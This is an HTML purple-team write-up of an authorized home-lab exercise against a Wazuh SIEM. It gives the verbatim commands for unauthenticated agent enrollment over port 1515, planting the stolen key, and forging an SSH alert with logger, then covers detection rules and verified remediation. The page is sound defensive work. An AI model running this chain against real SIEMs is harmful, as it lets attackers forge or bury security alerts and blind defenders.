@@ -1,0 +1,450 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Authorized purple-team POC: Wazuh SIEM rogue-agent log injection, with the full kill chain and verified remediation.">
+<meta name="color-scheme" content="light dark">
+<title>Rogue-Agent Log Injection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+
+<style>
+  :root{
+    --ground:#EAEEF2; --surface:#FFFFFF; --surface-2:#F5F8FA;
+    --ink:#151A22; --muted:#586270; --faint:#8A93A1; --line:#DBE1E8;
+    --attack:#BE4327; --attack-ink:#8F3620; --attack-soft:#F4E1DB;
+    --trust:#0C7680; --trust-ink:#0A5B63; --trust-soft:#DCEBED;
+    --term-bg:#0D1218; --term-line:#20293490; --term-ink:#C7D0DB; --term-cmd:#EAF0F6; --term-out:#828D9C;
+    --term-atk:#E7745A; --term-siem:#3DAFB8; --term-note:#6E7A88;
+    --radius:7px; --maxw:1080px;
+  }
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --ground:#0C1017; --surface:#141A22; --surface-2:#1A222C;
+      --ink:#E7ECF2; --muted:#9BA5B3; --faint:#69737F; --line:#28313D;
+      --attack:#E7745A; --attack-ink:#F0A08D; --attack-soft:#341C15;
+      --trust:#37AEB7; --trust-ink:#6FC8CE; --trust-soft:#123138;
+    }
+  }
+  :root[data-theme="dark"]{
+    --ground:#0C1017; --surface:#141A22; --surface-2:#1A222C;
+    --ink:#E7ECF2; --muted:#9BA5B3; --faint:#69737F; --line:#28313D;
+    --attack:#E7745A; --attack-ink:#F0A08D; --attack-soft:#341C15;
+    --trust:#37AEB7; --trust-ink:#6FC8CE; --trust-soft:#123138;
+  }
+
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0; background:var(--ground); color:var(--ink);
+    font-family:"IBM Plex Sans",system-ui,sans-serif; font-size:16px; line-height:1.7;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:var(--maxw); margin:0 auto; padding:0 24px}
+  .mono{font-family:"IBM Plex Mono",ui-monospace,monospace}
+
+  /* masthead */
+  header.mast{padding:56px 0 30px}
+  .eyebrow{font-family:"IBM Plex Mono",monospace; font-size:.72rem; font-weight:500;
+    letter-spacing:.22em; text-transform:uppercase; color:var(--attack); margin:0 0 18px}
+  .eyebrow .sep{color:var(--faint); margin:0 10px}
+  h1{font-family:"IBM Plex Mono",monospace; font-weight:600; font-size:clamp(2rem,5vw,3.1rem);
+    line-height:1.05; letter-spacing:-.01em; margin:0 0 18px; text-wrap:balance}
+  .thesis{font-size:clamp(1.05rem,2.2vw,1.3rem); color:var(--muted); max-width:60ch; margin:0 0 30px}
+  .thesis b{color:var(--ink); font-weight:600}
+  .meta{display:flex; flex-wrap:wrap; gap:10px 12px; font-family:"IBM Plex Mono",monospace; font-size:.8rem}
+  .chip{display:inline-flex; align-items:center; gap:7px; padding:6px 12px; border:1px solid var(--line);
+    border-radius:var(--radius); background:var(--surface); color:var(--muted)}
+  .chip b{color:var(--ink); font-weight:500}
+  .chip.ok{border-color:var(--trust); color:var(--trust-ink); background:var(--trust-soft)}
+  .chip .dot{width:7px; height:7px; border-radius:50%; background:var(--trust)}
+
+  section{padding:34px 0}
+  .kicker{font-family:"IBM Plex Mono",monospace; font-size:.72rem; letter-spacing:.2em;
+    text-transform:uppercase; color:var(--faint); margin:0 0 8px}
+  h2{font-family:"IBM Plex Mono",monospace; font-weight:600; font-size:1.5rem; margin:0 0 6px; letter-spacing:-.01em}
+  .lede{color:var(--muted); max-width:64ch; margin:0 0 26px}
+
+  /* diagram */
+  figure.flow{margin:0; border:1px solid var(--line); border-radius:12px; background:var(--surface); padding:26px 20px 14px; overflow:hidden}
+  .flow-scroll{overflow-x:auto; padding-bottom:6px}
+  figure.flow svg{display:block; width:100%; min-width:760px; height:auto}
+  figcaption{font-size:.9rem; color:var(--muted); margin-top:14px; padding-top:14px; border-top:1px solid var(--line)}
+  figcaption b{color:var(--ink); font-weight:600}
+  .svg-zone{font-family:"IBM Plex Mono",monospace; font-size:12.5px; font-weight:600; letter-spacing:.12em; text-transform:uppercase}
+  .svg-title{font-family:"IBM Plex Mono",monospace; font-size:13.5px; font-weight:600}
+  .svg-sub{font-family:"IBM Plex Mono",monospace; font-size:11px}
+  .svg-arrow-lbl{font-family:"IBM Plex Mono",monospace; font-size:11px; font-weight:500}
+  .n-box{fill:var(--surface); stroke:var(--line); stroke-width:1.5}
+  .n-atk{stroke:var(--attack)}
+  .n-trust{stroke:var(--trust)}
+  .n-t{fill:var(--ink)}
+  .n-atk-t{fill:var(--attack-ink)}
+  .n-trust-t{fill:var(--trust-ink)}
+  .n-sub{fill:var(--muted)}
+  .edge{stroke:var(--faint); stroke-width:1.6; fill:none}
+  .edge-atk{stroke:var(--attack); stroke-width:2.4; fill:none}
+  .edge-lbl{fill:var(--muted)}
+  .edge-lbl-atk{fill:var(--attack-ink)}
+  .boundary{stroke:var(--attack); stroke-width:1.6; stroke-dasharray:6 5; opacity:.75}
+  .boundary-lbl{fill:var(--attack); font-family:"IBM Plex Mono",monospace; font-size:10.5px; font-weight:600; letter-spacing:.18em}
+  .zone-atk{fill:var(--attack)}
+  .zone-trust{fill:var(--trust)}
+
+  /* steps */
+  .steps{display:flex; flex-direction:column; gap:18px}
+  .step{border:1px solid var(--line); border-radius:12px; background:var(--surface); overflow:hidden}
+  .step-head{display:flex; align-items:baseline; gap:14px; padding:16px 20px 12px}
+  .step-num{font-family:"IBM Plex Mono",monospace; font-size:1.1rem; font-weight:600; color:var(--faint);
+    font-variant-numeric:tabular-nums}
+  .step-title{font-weight:600; font-size:1.05rem; margin:0; flex:1}
+  .host-tag{font-family:"IBM Plex Mono",monospace; font-size:.7rem; font-weight:500; letter-spacing:.06em;
+    padding:4px 9px; border-radius:20px; white-space:nowrap; text-transform:lowercase}
+  .host-tag.atk{background:var(--attack-soft); color:var(--attack-ink)}
+  .host-tag.siem{background:var(--trust-soft); color:var(--trust-ink)}
+
+  .term{background:var(--term-bg); margin:0 14px 14px; border-radius:8px; border:1px solid var(--term-line)}
+  .term-head{display:flex; align-items:center; gap:10px; padding:9px 14px; border-bottom:1px solid var(--term-line);
+    font-family:"IBM Plex Mono",monospace; font-size:.74rem}
+  .term-host{font-weight:600}
+  .term-host.atk{color:var(--term-atk)}
+  .term-host.siem{color:var(--term-siem)}
+  .term-what{color:var(--term-note); margin-left:auto}
+  .term pre{margin:0; padding:13px 16px; overflow-x:auto; font-family:"IBM Plex Mono",monospace;
+    font-size:.82rem; line-height:1.65; color:var(--term-out)}
+  .term .cmd{color:var(--term-cmd); display:block; white-space:pre-wrap; word-break:break-word}
+  .term .cmd::before{content:"$ "; color:var(--term-atk)}
+  .term.siem .cmd::before{color:var(--term-siem)}
+  .term .out{color:var(--term-out); display:block; white-space:pre-wrap; word-break:break-word}
+  .term .hl-atk{color:var(--term-atk); font-weight:600}
+  .term .hl-trust{color:var(--term-siem); font-weight:600}
+  .proves{display:flex; gap:10px; padding:0 20px 18px; font-size:.92rem; color:var(--muted)}
+  .proves .arw{color:var(--trust); font-weight:600; font-family:"IBM Plex Mono",monospace; flex-shrink:0}
+  .proves b{color:var(--ink); font-weight:600}
+
+  /* analysis grid */
+  .grid{display:grid; grid-template-columns:repeat(auto-fit,minmax(min(100%,270px),1fr)); gap:16px}
+  .card{border:1px solid var(--line); border-radius:12px; background:var(--surface); padding:20px 22px}
+  .card.flaw{border-left:3px solid var(--attack)}
+  .card.impact{border-left:3px solid var(--attack)}
+  .card.tell{border-left:3px solid var(--trust)}
+  .card h3{font-family:"IBM Plex Mono",monospace; font-size:.78rem; letter-spacing:.12em; text-transform:uppercase;
+    margin:0 0 12px; color:var(--faint)}
+  .card p{margin:0 0 10px; font-size:.95rem}
+  .card p:last-child{margin-bottom:0}
+  .card code{font-family:"IBM Plex Mono",monospace; font-size:.85em; background:var(--surface-2);
+    padding:2px 6px; border-radius:4px; color:var(--attack-ink)}
+  .card.tell code{color:var(--trust-ink)}
+
+  /* mitre / remediation */
+  .split{display:grid; grid-template-columns:1fr 1fr; gap:16px}
+  @media (max-width:680px){.split{grid-template-columns:1fr}}
+  .att{display:flex; flex-direction:column; gap:8px}
+  .att-row{display:flex; gap:12px; align-items:baseline; padding:9px 0; border-bottom:1px solid var(--line)}
+  .att-row:last-child{border-bottom:0}
+  .att-id{font-family:"IBM Plex Mono",monospace; font-size:.8rem; font-weight:600; color:var(--attack-ink);
+    min-width:92px}
+  .att-name{font-size:.92rem; color:var(--muted)}
+  .fix{display:flex; flex-direction:column; gap:12px}
+  .fix-item{display:flex; gap:12px; align-items:baseline}
+  .fix-tag{font-family:"IBM Plex Mono",monospace; font-size:.68rem; font-weight:600; padding:3px 8px; border-radius:5px;
+    white-space:nowrap}
+  .fix-tag.now{background:var(--attack-soft); color:var(--attack-ink)}
+  .fix-tag.det{background:var(--trust-soft); color:var(--trust-ink)}
+  .fix-item p{margin:0; font-size:.93rem}
+  .fix-item b{font-weight:600}
+
+  footer{padding:34px 0 60px; border-top:1px solid var(--line); margin-top:20px}
+  .note{font-family:"IBM Plex Mono",monospace; font-size:.76rem; color:var(--faint); line-height:1.7; max-width:70ch}
+  .note b{color:var(--muted)}
+  hr.rule{border:0; border-top:1px solid var(--line); margin:0}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="mast">
+    <p class="eyebrow">Purple Team<span class="sep">/</span>Proof of Concept<span class="sep">/</span>SIEM Integrity</p>
+    <h1>Rogue-Agent Log Injection</h1>
+    <p class="thesis">An anonymous host on the network enrolled itself into the Wazuh SIEM with <b>no credential</b>, became a trusted agent, and injected a <b>forged security alert</b> — a fake SSH brute-force from an attacker-chosen IP — straight into the SOC's trusted alert stream.</p>
+    <div class="meta">
+      <span class="chip"><b>Target</b> wazuh-m · 198.51.100.10</span>
+      <span class="chip"><b>Source</b> caldera-c2 · .134</span>
+      <span class="chip"><b>Date</b> 2026-08-20</span>
+      <span class="chip ok"><span class="dot"></span>Authorized lab · own infrastructure</span>
+    </div>
+  </header>
+
+  <hr class="rule">
+
+  <section>
+    <p class="kicker">The mechanism</p>
+    <h2>Crossing the trust boundary</h2>
+    <p class="lede">The whole exploit turns on one move: an unauthenticated enrollment converts an untrusted attacker host into a <em>trusted</em> agent. Once across that line, everything the attacker writes is believed.</p>
+
+    <figure class="flow">
+      <div class="flow-scroll">
+        <svg viewBox="0 0 1140 320" role="img" aria-label="Flow: caldera-c2 probes port 1515, enrolls with no password to steal an agent key, installs an agent to become Agent 003 which crosses the trust boundary into the SIEM, then injects a forged log that is indexed as a trusted alert and shown to the SOC as a real attack.">
+          <!-- zone labels -->
+          <text x="20" y="30" class="svg-zone zone-atk">Untrusted — attacker</text>
+          <text x="1120" y="30" text-anchor="end" class="svg-zone zone-trust">Trusted — SIEM</text>
+
+          <!-- trust boundary -->
+          <line x1="612" y1="48" x2="612" y2="286" class="boundary"/>
+          <text x="612" y="304" text-anchor="middle" class="boundary-lbl">TRUST BOUNDARY</text>
+
+          <!-- Node 1: attacker -->
+          <rect x="16" y="120" width="170" height="74" rx="7" class="n-box n-atk"/>
+          <text x="101" y="150" text-anchor="middle" class="svg-title n-atk-t">caldera-c2</text>
+          <text x="101" y="170" text-anchor="middle" class="svg-sub n-sub">attacker host</text>
+
+          <!-- edge 1 -->
+          <line x1="186" y1="157" x2="248" y2="157" class="edge" marker-end="url(#ar)"/>
+          <text x="217" y="147" text-anchor="middle" class="svg-arrow-lbl edge-lbl">nmap</text>
+
+          <!-- Node 2: authd flaw -->
+          <rect x="248" y="120" width="170" height="74" rx="7" class="n-box n-atk"/>
+          <text x="333" y="150" text-anchor="middle" class="svg-title n-t">authd :1515</text>
+          <text x="333" y="170" text-anchor="middle" class="svg-sub n-atk-t">use_password: no</text>
+
+          <!-- edge 2 -->
+          <line x1="418" y1="157" x2="480" y2="157" class="edge-atk" marker-end="url(#ar-atk)"/>
+          <text x="449" y="147" text-anchor="middle" class="svg-arrow-lbl edge-lbl-atk">enroll</text>
+
+          <!-- Node 3: stolen key -->
+          <rect x="480" y="120" width="130" height="74" rx="7" class="n-box n-atk"/>
+          <text x="545" y="150" text-anchor="middle" class="svg-title n-atk-t">key 003</text>
+          <text x="545" y="170" text-anchor="middle" class="svg-sub n-sub">stolen identity</text>
+
+          <!-- edge 3 crosses boundary -->
+          <line x1="610" y1="157" x2="676" y2="157" class="edge-atk" marker-end="url(#ar-atk)"/>
+          <text x="643" y="147" text-anchor="middle" class="svg-arrow-lbl edge-lbl-atk">auth</text>
+
+          <!-- Node 4: trusted agent -->
+          <rect x="676" y="120" width="170" height="74" rx="7" class="n-box n-trust"/>
+          <text x="761" y="150" text-anchor="middle" class="svg-title n-trust-t">Agent 003</text>
+          <text x="761" y="170" text-anchor="middle" class="svg-sub n-sub">Active · trusted</text>
+
+          <!-- edge 4 -->
+          <line x1="846" y1="157" x2="908" y2="157" class="edge-atk" marker-end="url(#ar-atk)"/>
+          <text x="877" y="147" text-anchor="middle" class="svg-arrow-lbl edge-lbl-atk">logger</text>
+
+          <!-- Node 5: alert index -->
+          <rect x="908" y="120" width="160" height="74" rx="7" class="n-box n-trust"/>
+          <text x="988" y="150" text-anchor="middle" class="svg-title n-t">wazuh-alerts</text>
+          <text x="988" y="170" text-anchor="middle" class="svg-sub n-atk-t">forged record</text>
+
+          <!-- edge 5 down to SOC -->
+          <line x1="988" y1="194" x2="988" y2="232" class="edge" marker-end="url(#ar)"/>
+          <!-- Node 6: SOC -->
+          <rect x="884" y="232" width="208" height="58" rx="7" class="n-box"/>
+          <text x="988" y="258" text-anchor="middle" class="svg-title n-t">SOC dashboard</text>
+          <text x="988" y="276" text-anchor="middle" class="svg-sub n-atk-t">“attack” from 203.0.113.66</text>
+
+          <defs>
+            <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto">
+              <path d="M0,0 L9,4.5 L0,9 z" style="fill:var(--faint)"/>
+            </marker>
+            <marker id="ar-atk" markerWidth="9" markerHeight="9" refX="7" refY="4.5" orient="auto">
+              <path d="M0,0 L9,4.5 L0,9 z" style="fill:var(--attack)"/>
+            </marker>
+          </defs>
+        </svg>
+      </div>
+      <figcaption><b>The red path is the attack.</b> Enrollment on 1515 hands the attacker a valid key with no password; installing an agent with that key moves the identity across the trust boundary, after which a single <span class="mono">logger</span> line becomes a trusted alert the SOC cannot distinguish from a real one.</figcaption>
+    </figure>
+  </section>
+
+  <section>
+    <p class="kicker">The kill chain</p>
+    <h2>Seven commands, verbatim</h2>
+    <p class="lede">Every command below was run during the exercise; every output is copied from the terminal. Prompts are colored by host — <span class="mono" style="color:var(--attack-ink)">attacker</span> versus <span class="mono" style="color:var(--trust-ink)">SIEM</span>.</p>
+
+    <div class="steps">
+
+      <!-- 1 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">01</span>
+          <h3 class="step-title">Recon — find the SIEM's exposed ports</h3>
+          <span class="host-tag atk">caldera-c2</span>
+        </div>
+        <div class="term">
+          <div class="term-head"><span class="term-host atk">root@caldera-c2</span><span class="term-what">port scan</span></div>
+          <pre><span class="cmd">nmap -Pn -n -sS -p 22,443,514,1514,1515,5514,9200,55000 198.51.100.10</span>
+<span class="out">1515/tcp  <span class="hl-atk">open</span>   ifor-protocol      # agent enrollment
+55000/tcp <span class="hl-atk">open</span>   unknown            # Wazuh API
+9200/tcp  closed wap-wsp            # indexer, loopback-only</span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>Agent enrollment (<b>1515</b>) is reachable from a neighboring host; the indexer is correctly closed.</span></div>
+      </div>
+
+      <!-- 2 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">02</span>
+          <h3 class="step-title">Find the flaw — enrollment needs no password</h3>
+          <span class="host-tag siem">wazuh-m</span>
+        </div>
+        <div class="term siem">
+          <div class="term-head"><span class="term-host siem">root@wazuh-m</span><span class="term-what">config read</span></div>
+          <pre><span class="cmd">grep -i use_password /var/ossec/etc/ossec.conf</span>
+<span class="out">      &lt;use_password&gt;<span class="hl-atk">no</span>&lt;/use_password&gt;</span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>The manager accepts <b>any</b> new agent with no shared secret — anonymous enrollment is possible.</span></div>
+      </div>
+
+      <!-- 3 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">03</span>
+          <h3 class="step-title">Steal a trusted identity</h3>
+          <span class="host-tag atk">caldera-c2</span>
+        </div>
+        <div class="term">
+          <div class="term-head"><span class="term-host atk">root@caldera-c2</span><span class="term-what">unauthenticated enroll</span></div>
+          <pre><span class="cmd">echo "OSSEC A:'ROGUE-TEST-2'" | openssl s_client -connect 198.51.100.10:1515 -quiet</span>
+<span class="out">OSSEC K:'<span class="hl-atk">003 ROGUE-TEST-2 any [redacted]</span>'</span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>An anonymous host received a <b>working agent key</b> — no credential, no challenge, no approval.</span></div>
+      </div>
+
+      <!-- 4 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">04</span>
+          <h3 class="step-title">Become a trusted agent</h3>
+          <span class="host-tag atk">caldera-c2</span>
+        </div>
+        <div class="term">
+          <div class="term-head"><span class="term-host atk">root@caldera-c2</span><span class="term-what">plant key, start agent</span></div>
+          <pre><span class="cmd">apt-get install -y wazuh-agent=4.14.5-1</span>
+<span class="cmd">printf "003 ROGUE-TEST-2 any [redacted]…\n" &gt; /var/ossec/etc/client.keys</span>
+<span class="cmd">sed -i 's#&lt;address&gt;.*#&lt;address&gt;198.51.100.10&lt;/address&gt;#' /var/ossec/etc/ossec.conf</span>
+<span class="cmd">systemctl start wazuh-agent</span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>The attacker host now runs a real Wazuh agent authenticating with the stolen key.</span></div>
+      </div>
+
+      <!-- 5 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">05</span>
+          <h3 class="step-title">Foothold confirmed — the SIEM trusts it</h3>
+          <span class="host-tag siem">wazuh-m</span>
+        </div>
+        <div class="term siem">
+          <div class="term-head"><span class="term-host siem">root@wazuh-m</span><span class="term-what">agent list</span></div>
+          <pre><span class="cmd">/var/ossec/bin/agent_control -l</span>
+<span class="out">   ID: 001, Name: victim-linux1,       IP: any, Active
+   ID: 003, Name: <span class="hl-atk">ROGUE-TEST-2</span>, IP: any, <span class="hl-trust">Active</span></span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>The SIEM lists the attacker host as an <b>Active, trusted agent</b> beside the real one.</span></div>
+      </div>
+
+      <!-- 6 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">06</span>
+          <h3 class="step-title">Forge a security event</h3>
+          <span class="host-tag atk">caldera-c2</span>
+        </div>
+        <div class="term">
+          <div class="term-head"><span class="term-host atk">root@caldera-c2</span><span class="term-what">write to journal</span></div>
+          <pre><span class="cmd">logger -t sshd "Failed password for invalid user PURPLEINJECT from 203.0.113.66 port 4444 ssh2"</span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>The attacker writes an arbitrary "attack" line the trusted agent will forward as its own telemetry.</span></div>
+      </div>
+
+      <!-- 7 -->
+      <div class="step">
+        <div class="step-head">
+          <span class="step-num">07</span>
+          <h3 class="step-title">It lands as a trusted alert</h3>
+          <span class="host-tag siem">wazuh-m</span>
+        </div>
+        <div class="term siem">
+          <div class="term-head"><span class="term-host siem">root@wazuh-m</span><span class="term-what">query the alert index</span></div>
+          <pre><span class="cmd">curl … wazuh-alerts-* -d '{"query":{"match_phrase":{"full_log":"PURPLEINJECT"}}}'</span>
+<span class="out">hits: 1
+  agent <span class="hl-atk">003/ROGUE-TEST-2</span>  rule 5710/L5: sshd: Attempt to login using a
+  non-existent user   fake-srcip=<span class="hl-atk">203.0.113.66</span></span></pre>
+        </div>
+        <div class="proves"><span class="arw">proves</span><span>A forged SSH brute-force alert from an attacker-chosen IP now sits in the SOC's <b>trusted</b> alert stream.</span></div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <p class="kicker">Analysis</p>
+    <h2>Why it worked, and what it costs</h2>
+    <div class="grid">
+      <div class="card flaw">
+        <h3>The flaw</h3>
+        <p>Wazuh's enrollment service (<code>authd</code>, port 1515) ran with <code>use_password: no</code> and was reachable from a neighboring host.</p>
+        <p>Enrollment is meant to be a brief, trusted bootstrap. Left open, it is an <b>anonymous grant of a trusted identity</b>.</p>
+      </div>
+      <div class="card impact">
+        <h3>The impact</h3>
+        <p>Once trusted, the agent controls a telemetry feed. It can <b>forge</b> alerts to bait or exhaust the SOC, or <b>bury</b> real activity under injected noise.</p>
+        <p>This subverts integrity, not just a host — it attacks the thing that is supposed to see every other attack.</p>
+      </div>
+      <div class="card tell">
+        <h3>The only tell</h3>
+        <p>The forged event used <code>203.0.113.66</code> — an RFC 5737 documentation IP that cannot route. Its blank GeoLocation was the sole giveaway.</p>
+        <p>A real attacker picks a live IP, and the forged alert becomes <b>indistinguishable</b> from the genuine ones beside it.</p>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="split">
+      <div class="card">
+        <h3 class="mono" style="font-size:.78rem;letter-spacing:.12em;text-transform:uppercase;color:var(--faint);margin:0 0 14px">MITRE ATT&amp;CK</h3>
+        <div class="att">
+          <div class="att-row"><span class="att-id">T1046</span><span class="att-name">Network Service Discovery — the recon scan</span></div>
+          <div class="att-row"><span class="att-id">T1078</span><span class="att-name">Valid Accounts — the stolen trusted identity</span></div>
+          <div class="att-row"><span class="att-id">T1565.001</span><span class="att-name">Stored Data Manipulation — the forged record</span></div>
+          <div class="att-row"><span class="att-id">T1562</span><span class="att-name">Impair Defenses — poisoning the SIEM</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <h3 class="mono" style="font-size:.78rem;letter-spacing:.12em;text-transform:uppercase;color:var(--faint);margin:0 0 14px">Response</h3>
+        <div class="fix">
+          <div class="fix-item"><span class="fix-tag det">detect</span><p><b>Built &amp; live.</b> Custom rules now alert on enrollment requests and API brute-force; a re-run of this chain fires them.</p></div>
+          <div class="fix-item"><span class="fix-tag now">prevent</span><p><b>The real fix.</b> Set <code style="color:var(--attack-ink)">use_password</code> on authd or close 1515 by default; bind the API to loopback; firewall the SIEM.</p></div>
+          <div class="fix-item"><span class="fix-tag now">harden</span><p>Ship alerts off-box to append-only storage so a compromised SIEM cannot rewrite its own history.</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <p class="kicker">Remediation · verified</p>
+    <h2>Found → detected → fixed → re-tested</h2>
+    <p class="lede">The entry point was closed at the source. Enrollment now requires a shared secret (<span class="mono">use_password: yes</span> + <span class="mono">authd.pass</span>), and a new rule fires on agent removal. The <em>identical</em> command from Step 3 was re-run to confirm the fix holds.</p>
+    <div class="grid">
+      <div class="term">
+        <div class="term-head"><span class="term-host atk">root@caldera-c2</span><span class="term-what" style="color:var(--term-atk)">before · vulnerable</span></div>
+        <pre><span class="cmd">echo "OSSEC A:'ROGUE'" | openssl s_client -connect …:1515 -quiet</span>
+<span class="out">OSSEC K:'<span class="hl-atk">003 ROGUE-TEST-2 any [redacted]</span>'   ← key handed over</span></pre>
+      </div>
+      <div class="term">
+        <div class="term-head"><span class="term-host atk">root@caldera-c2</span><span class="term-what" style="color:var(--term-siem)">after · fixed</span></div>
+        <pre><span class="cmd">echo "OSSEC A:'ROGUE'" | openssl s_client -connect …:1515 -quiet</span>
+<span class="out"><span class="hl-trust">ERROR: Invalid password. Unable to add agent</span>   ← blocked</span></pre>
+      </div>
+    </div>
+    <div class="proves" style="margin-top:16px"><span class="arw">result</span><span>The unauthenticated foothold is closed, and the same chain now raises alerts at enrollment (rule <span class="mono">100361</span>) and at removal (rule <span class="mono">100363</span>). <b>Detection proved the risk; configuration removed it.</b></span></div>
+  </section>
+
+  <footer>
+    <p class="note"><b>Authorized exercise.</b> Every action was performed by the lab owner against their own infrastructure, in an isolated home-lab SIEM, to validate detection and drive remediation. No third-party systems were involved. The single forged record has been purged from the index; the evidence export is retained. This document is a defensive purple-team artifact.</p>
+  </footer>
+
+</div>
+</body>
+</html>
